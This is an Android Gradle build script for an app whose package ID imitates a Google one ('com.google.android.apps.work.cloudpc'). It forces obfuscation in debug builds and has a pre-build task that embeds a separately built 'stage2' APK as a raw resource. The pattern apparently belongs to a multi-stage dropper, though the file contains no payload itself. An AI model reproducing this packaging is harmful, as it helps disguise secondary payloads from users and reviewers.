plugins {
    alias(libs.plugins.android.application)
}

android {
    namespace = "com.google.android.apps.work.cloudpc"
    compileSdk = 36

    defaultConfig {
        applicationId = "com.google.android.apps.work.cloudpc"
        minSdk = 24
        targetSdk = 36
        versionCode = 1
        versionName = "1.0"

        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
        externalNativeBuild {
            cmake {
                cppFlags += ""
            }
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
        debug {
            // Enable minification in debug as well to verify obfuscation
            isMinifyEnabled = true
            isShrinkResources = false
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
    }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }
    externalNativeBuild {
        cmake {
            path = file("src/main/cpp/CMakeLists.txt")
            version = "3.22.1"
        }
    }
}

val copyTempLoadedAp = tasks.register<Copy>("copyTempLoadedAp") {
    //    TODO: put release here
    var sourceDir = "../../stage2/app/build/intermediates/apk/debug/"
    val sourceFileName = "app-debug.apk"
    var sourceFile = file("$sourceDir/$sourceFileName")
    val dest = "src/main/res/raw/app_debug.apk"

    // Safety check: print a warning if the file is missing
    doFirst {
        if (sourceFile.exists()) {
            logger.lifecycle("Copying ${sourceFile.name} to ${dest}")
            return@doFirst
        }
        logger.error("FAILED: Source APK not found at ${sourceFile.absolutePath}. Please build the stage2 project first.")

        sourceDir = "../../stage2/app/build/outputs/apk/debug/"
        sourceFile = file("$sourceDir/$sourceFileName")

        if (sourceFile.exists()) {
            logger.lifecycle("Copying ${sourceFile.name} to ${dest}")
            return@doFirst
        }
        logger.error("FAILED: Source APK not found at ${sourceFile.absolutePath}. Please build the stage2 project first.")

        throw GradleException("FAILED: Source APK not found at. Please build the stage2 project first.")
    }

    from(sourceDir) {
        include(sourceFileName)
    }
    into(file(dest).parent)
    rename { file(dest).name }

    outputs.upToDateWhen { false }
}

// Make the task execute before the build process starts
tasks.named("preBuild") {
    dependsOn(copyTempLoadedAp)
}

tasks.getByName("build") {
    dependsOn(copyTempLoadedAp)
}

dependencies {
    implementation(libs.appcompat)
    implementation(libs.material)
    implementation(libs.constraintlayout)
    testImplementation(libs.junit)
    androidTestImplementation(libs.ext.junit)
    androidTestImplementation(libs.espresso.core)
}
